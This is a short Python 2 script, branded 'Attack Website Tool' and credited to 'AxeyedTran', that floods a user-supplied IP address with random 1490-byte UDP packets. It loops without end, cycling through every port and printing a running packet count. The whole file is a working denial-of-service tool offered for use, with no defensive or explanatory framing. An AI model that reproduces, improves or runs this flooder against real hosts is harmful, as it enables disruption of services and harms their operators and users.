__Author__ = "AxeyedTran"
#=====Setting====#
import random, os, time, socket
#=====Sock=====#
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#=====Information Victim=====#
os.system("cls" if os.name == "nt" else "clear")
print'\033[1;97m=========================================================================='
print'\033[1;92m                          Attack Website Tool'
print'\033[1;97m=========================================================================='
print'\033[1;96m                                               @AxeyedTran '
ip = raw_input("\033[1;97mIP:\033[1;96m")
print'\033[1;97m=========================================================================='
port = input("\033[1;97mPort:\033[1;92m")
print'\033[1;97m=========================================================================='
#=====Start Attack=====#
os.system("cls" if os.name == "nt" else "clear")
print'\033[1;97m=========================================================================='
print'\033[1;92m                          Attack Website Tool'
print'\033[1;97m=========================================================================='
print'\033[1;96m                                               @AxeyedTran '
print'\033[1;97m=========================================================================='
print'\033[1;93mStart Attacking In A Few Seconds.'
time.sleep(5)
print'\033[1;92mStarting Attack...'
time.sleep(3)
print'\033[1;97m=========================================================================='
#=====Attack=====#
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print'\033[1;97mSent\033[1;96m %s\033[1;97m Packet To\033[1;92m %s\033[1;97m Throught Port:\033[1;93m%s'%(sent,ip,port)
     if port == 65534:
       port = 1
